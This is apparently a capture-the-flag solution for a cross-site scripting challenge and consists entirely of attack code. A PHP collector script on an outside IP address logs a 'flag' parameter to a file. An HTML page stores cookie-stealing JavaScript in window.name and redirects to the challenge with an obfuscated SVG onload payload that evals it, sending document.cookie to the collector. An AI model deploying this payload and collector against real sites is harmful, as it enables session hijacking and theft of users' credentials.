<?php
$f = fopen("res.txt", "w");
fwrite($f, $_GET['flag']);
?>

<script>
    window.name="window.location.href='http://140.113.68.171:8000/test.php?flag='+document.cookie";
    window.location="https://edu-ctf.kaibro.tw:30678/hackme.php?q=%3CSVG/ONLoAD=eval(n%26%2397;m\\u{65})%3E";
</script>
